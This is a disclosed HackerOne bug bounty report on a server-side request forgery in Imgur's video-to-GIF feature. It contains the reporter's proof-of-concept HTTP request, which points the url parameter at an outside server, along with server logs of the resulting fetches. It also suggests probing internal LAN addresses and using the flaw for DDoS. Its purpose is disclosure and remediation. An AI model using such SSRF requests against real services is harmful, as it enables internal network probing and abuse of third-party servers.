{"id":91816,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTgxNg==","url":"https://hackerone.com/reports/91816","title":"Server Side Request Forgery In Video to GIF Functionality","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2015-10-01T20:24:33.740Z","submitted_at":"2015-10-01T20:24:33.740Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"1n3","url":"/1n3","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":638,"url":"https://hackerone.com/imgur","handle":"imgur","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Imgur","twitter_handle":"imgur","website":"http://imgur.com","about":"The most awesome images on the Internet."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-03-22T17:17:49.859Z","bug_reporter_agreed_on_going_public_at":"2016-03-22T16:05:47.867Z","team_member_agreed_on_going_public_at":"2016-03-22T17:17:49.653Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"imgur.com is vulnerable to Server Side Request Forgery because it fails to sanitize or verify the \"url\" GET parameter.\n\nThis could be used by attackers to launch attacks against other 3rd party sites or proxy an attackers requests through the affected site to hide the attackers origin. In more extreme cases, this could be used to exploit the back-end application making the request from the server (ie. Ruby) which would result in a compromise of the server or this could point to malicious content running on the attackers server (attacker.org) which is then included in the sites web content. Also, since the requests originate from the server, it may also be possible to make requests to the internal corporate LAN by making the server request internal sites like: http://192.168.1.1, etc... making these requests over and over again would cause a small DoS attack possibly. If multiple attackers leverage this flaw, it would allow a DDoS attack originating from your servers to the target server (ie. facebook.com for instance...). \n\nTo prevent this, the application should first check to see if the URL specified is a valid image extension before sending the actual GET request to the remote site. An attacker could still use a valid image URL on a remote site, but if you implement a token system or throttle the amount of requests you can send (ie. if the same IP/user requests this page more than 5 times, prompt them to enter a captcha to continue submitting more requests, etc.\n\nIn the below request, I have include the url parameter to point to my own server and below are my Apache access logs showing the requests from your server.\n\nGET /vidgif/url?url=https://crowdshield.com/.testing/xss.html%00 HTTP/1.1\nHost: imgur.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nReferer: http://imgur.com/vidgif?url=h\nCookie: IMGURUIDJAFO=e57f07d0885dc45d0f0e811a4f1b39ed35b0475651284d28cfd75ee514e3c3b9; _ga=GA1.2.1459742099.1443658888; LASTJAFO=1443710040688; __qca=P0-2118447999-1443658888401; m_sort=viral; m_window=day; m_section=hot; __gads=ID=477008cd7ae64f71:T=1443659370:S=ALNI_Mb4wvR8jFUzZIIJ77A6eSKNrGVb6g; SECONDSESSION=1443708344883; IMGURSESSION=gkao17cqb6u5341vct6pmtqqe6; _nc=1; _gat=1; AZUSER=ue1-ac59c4f6d4bb462bb1f94481551a4313; OX_plg=swf|shk|pm\nConnection: close\n\n==\u003e /var/log/apache2/crowdshield_access.log \u003c==\n54.145.111.81 - - [01/Oct/2015:15:35:43 -0400] \"HEAD /.testing/redirect_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.145.111.81 - - [01/Oct/2015:15:35:44 -0400] \"HEAD /.testing/redirect_vuln.txt HTTP/1.1\" 200 288 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.145.111.81 - - [01/Oct/2015:15:35:44 -0400] \"GET /.testing/redirect_vuln.txt HTTP/1.1\" 200 47118 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.145.111.81 - - [01/Oct/2015:15:35:45 -0400] \"HEAD /.testing/redirect_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.196.2.255 - - [01/Oct/2015:15:35:45 -0400] \"HEAD /.testing/rfi_vuln.php HTTP/1.1\" 200 120 \"-\" \"-\"\n54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] \"HEAD /.testing/rfi_vuln.php HTTP/1.1\" 200 183 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] \"GET /.testing/rfi_vuln.php HTTP/1.1\" 200 47092 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] \"HEAD /.testing/rfi_vuln.php HTTP/1.1\" 200 120 \"-\" \"-\"\n54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] \"HEAD /.testing/rfi_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.196.2.255 - - [01/Oct/2015:15:35:50 -0400] \"HEAD /.testing/rfi_vuln.txt HTTP/1.1\" 200 288 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.196.2.255 - - [01/Oct/2015:15:35:50 -0400] \"GET /.testing/rfi_vuln.txt HTTP/1.1\" 200 47158 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.196.2.255 - - [01/Oct/2015:15:35:50 -0400] \"HEAD /.testing/rfi_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.81.242.65 - - [01/Oct/2015:15:35:50 -0400] \"HEAD /.testing/xss_vuln.php HTTP/1.1\" 200 120 \"-\" \"-\"\n54.81.242.65 - - [01/Oct/2015:15:35:52 -0400] \"HEAD /.testing/xss_vuln.php HTTP/1.1\" 200 183 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.81.242.65 - - [01/Oct/2015:15:35:52 -0400] \"GET /.testing/xss_vuln.php HTTP/1.1\" 200 236 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.146.201.15 - - [01/Oct/2015:15:35:52 -0400] \"HEAD /.testing/rfi_vuln.php HTTP/1.1\" 200 120 \"-\" \"-\"\n54.146.201.15 - - [01/Oct/2015:15:35:54 -0400] \"HEAD /.testing/rfi_vuln.php HTTP/1.1\" 200 183 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.146.201.15 - - [01/Oct/2015:15:35:54 -0400] \"GET /.testing/rfi_vuln.php HTTP/1.1\" 200 47092 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.146.201.15 - - [01/Oct/2015:15:35:54 -0400] \"HEAD /.testing/rfi_vuln.php HTTP/1.1\" 200 120 \"-\" \"-\"\n54.146.24.64 - - [01/Oct/2015:15:35:54 -0400] \"HEAD /.testing/redirect_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.146.24.64 - - [01/Oct/2015:15:35:56 -0400] \"HEAD /.testing/redirect_vuln.txt HTTP/1.1\" 200 288 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.146.24.64 - - [01/Oct/2015:15:35:56 -0400] \"GET /.testing/redirect_vuln.txt HTTP/1.1\" 200 47118 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.146.24.64 - - [01/Oct/2015:15:35:56 -0400] \"HEAD /.testing/redirect_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.81.242.65 - - [01/Oct/2015:15:35:56 -0400] \"HEAD /.testing/xss_vuln.html HTTP/1.1\" 200 246 \"-\" \"-\"\n54.81.242.65 - - [01/Oct/2015:15:35:58 -0400] \"HEAD /.testing/xss_vuln.html HTTP/1.1\" 200 287 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.81.242.65 - - [01/Oct/2015:15:35:58 -0400] \"GET /.testing/xss_vuln.html HTTP/1.1\" 200 13136 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.80.37.176 - - [01/Oct/2015:15:35:58 -0400] \"HEAD /.testing/xss_vuln.php HTTP/1.1\" 200 120 \"-\" \"-\"\n54.80.37.176 - - [01/Oct/2015:15:36:00 -0400] \"HEAD /.testing/xss_vuln.php HTTP/1.1\" 200 183 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.80.37.176 - - [01/Oct/2015:15:36:00 -0400] \"GET /.testing/xss_vuln.php HTTP/1.1\" 200 236 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.83.124.201 - - [01/Oct/2015:15:36:00 -0400] \"HEAD /.testing/rfi_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.83.124.201 - - [01/Oct/2015:15:36:02 -0400] \"HEAD /.testing/rfi_vuln.txt HTTP/1.1\" 200 288 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.83.124.201 - - [01/Oct/2015:15:36:02 -0400] \"GET /.testing/rfi_vuln.txt HTTP/1.1\" 200 47158 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)\"\n54.83.124.201 - - [01/Oct/2015:15:36:02 -0400] \"HEAD /.testing/rfi_vuln.txt HTTP/1.1\" 200 247 \"-\" \"-\"\n54.158.37.153 - - [01/Oct/2015:15:36:02 -0400] \"HEAD /.testing/xss.html HTTP/1.1\" 200 243 \"-\" \"-\"\n","bounty_amount":"1600.0","formatted_bounty":"$1,600","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-21T16:05:48.101Z","allow_singular_disclosure_after":-172712179.74611938,"singular_disclosure_allowed":true,"vote_count":7,"voters":["michiel","bogdantcaciuc","1n3","madrobot","spetr0x","dyabla","ghostin_shell"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":614814,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Hello. Thanks for the report! Based on your initial description, we do not think that the security implications of the behavior you have described warrant further action in this particular instance. \n","automated_response":false,"created_at":"2015-10-08T21:57:39.014Z","updated_at":"2015-10-08T21:57:39.014Z","actor":{"username":"jacobg","cleared":false,"url":"/jacobg","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":614822,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay, glad to hear... ","automated_response":false,"created_at":"2015-10-08T21:59:47.713Z","updated_at":"2015-10-08T21:59:47.713Z","actor":{"username":"1n3","cleared":true,"url":"/1n3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862296,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @1n3, after working with the team at Imgur, we've decided that since this was an error on our part, and because your report appears to be the first instance of this, we're going to reward you at the new pay scale as if you had made the original report we acted on. However, part of the award value comes from the thoroughness of the report, and since #115748 was so complete, we had given him a 25% increase on the original payout amount of $1600.\n\nWe're working on learning how to handle our program better, and we regret giving you this poor experience. Please always feel free to follow up with us directly on the hackerone platform if you feel we've made a mistake - we're all human here and are always willing to revisit our decisions and try to make things right.","automated_response":false,"created_at":"2016-03-22T15:59:44.577Z","updated_at":"2016-03-22T15:59:44.577Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Imgur"}},"bounty_amount":"1600.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"imgur","collaborator":{"username":"1n3","url":"/1n3"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862307,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","automated_response":false,"created_at":"2016-03-22T16:05:22.781Z","updated_at":"2016-03-22T16:05:22.781Z","actor":{"username":"1n3","cleared":true,"url":"/1n3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862309,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-03-22T16:05:47.907Z","updated_at":"2016-03-22T16:05:47.907Z","first_to_agree":true,"actor":{"username":"1n3","cleared":true,"url":"/1n3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862542,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-03-22T17:17:49.698Z","updated_at":"2016-03-22T17:17:49.698Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862543,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-03-22T17:17:49.890Z","updated_at":"2016-03-22T17:17:49.890Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862881,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2016-03-22T19:07:50.084Z","updated_at":"2016-03-22T19:07:50.084Z","additional_data":{"duplicate_report_id":110245},"actor":{"username":"dz_samir","cleared":true,"url":"/dz_samir","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/509/aeaf928765aaf914ff957b2e34617aeee7759f0b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1094535,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2016-07-29T07:24:14.411Z","updated_at":"2016-07-29T07:24:14.411Z","additional_data":{"duplicate_report_id":136304},"actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3805785,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","automated_response":false,"created_at":"2018-12-11T14:02:12.454Z","updated_at":"2018-12-11T14:02:12.454Z","actor":{"username":"haxta4ok00","cleared":true,"url":"/haxta4ok00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/175/8449afdd3403f4de00b34719ee09823bad1c0a06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"removed_user":{"url":"/haxta4ok00","username":"haxta4ok00"},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}